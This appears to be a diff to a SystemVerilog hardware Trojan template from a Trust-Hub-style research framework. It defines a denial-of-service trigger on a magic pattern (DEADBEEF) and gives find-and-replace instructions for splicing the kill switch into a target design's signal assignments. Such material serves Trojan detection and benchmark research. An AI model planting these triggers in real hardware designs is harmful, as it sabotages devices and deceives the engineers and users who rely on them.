@@ -1,34 +1,41 @@
 /**
- * Hardware Trojan Template: Denial of Service (DoS)
+ * Combinational DoS Trojan - Code Snippet
  * 
- * Category: Combinational Logic
- * Pattern Type: Denial of Service
- * 
- * Source: Trust-Hub Benchmark AES-T1400
- * Reference: https://trust-hub.org/benchmarks/AES-T1400
+ * Trust-Hub Category: Denial of Service ✓ (Verified)
+ * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
  * 
  * Description:
- *   Condition-based signal disabling for combinational logic.
- *
- * Author: Sharjeel Imtiaz (Tallinn University of Technology)
+ *   Disables control signals based on trigger condition
+ *   
+ * Trigger: Pattern match on {{TRIGGER_SIGNAL}}
+ * Payload: Force {{PAYLOAD_SIGNAL}} = 0
+ * 
+ * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
-module {{MODULE_NAME}}_trojan (
-    input  logic {{TRIGGER_SIGNAL}},
-    input  logic [{{WIDTH}}-1:0] {{TRIGGER_CONDITION}},
-    input  logic {{NORMAL_OUTPUT}},
-    output logic {{TROJAN_OUTPUT}}
-);
+// ============================================================
+// TROJAN TRIGGER LOGIC (Condition-based)
+// ============================================================
 
-    localparam logic [{{WIDTH}}-1:0] TRIGGER_PATTERN = {{WIDTH}}'hDEAD;
-    
-    wire trojan_active;
-    
-    assign trojan_active = ({{TRIGGER_CONDITION}} == TRIGGER_PATTERN);
-    
-    assign {{TROJAN_OUTPUT}} = trojan_active ? 
-                               1'b0 : 
-                               {{NORMAL_OUTPUT}};
+// Magic pattern that triggers the trojan
+localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;
 
-endmodule
+// Trojan activates when trigger signal matches pattern
+wire trojan_active;
+assign trojan_active = ({{TRIGGER_SIGNAL}} == TRIGGER_PATTERN);
+
+// ============================================================
+// PAYLOAD MODIFICATION INSTRUCTIONS
+// ============================================================
+// DoS Attack: Disable {{PAYLOAD_SIGNAL}} when pattern detected
+//
+// Integration Script Must Modify:
+//
+// IF {{PAYLOAD_SIGNAL}} is assigned:
+//   Find: assign {{PAYLOAD_SIGNAL}} = value;
+//   Replace: assign {{PAYLOAD_SIGNAL}} = trojan_active ? 1'b0 : value;
+//
+// IF {{PAYLOAD_SIGNAL}} is used in expression:
+//   Find: some_output = {{PAYLOAD_SIGNAL}} & other_signal;
+//   Replace: some_output = (trojan_active ? 1'b0 : {{PAYLOAD_SIGNAL}}) & other_signal;
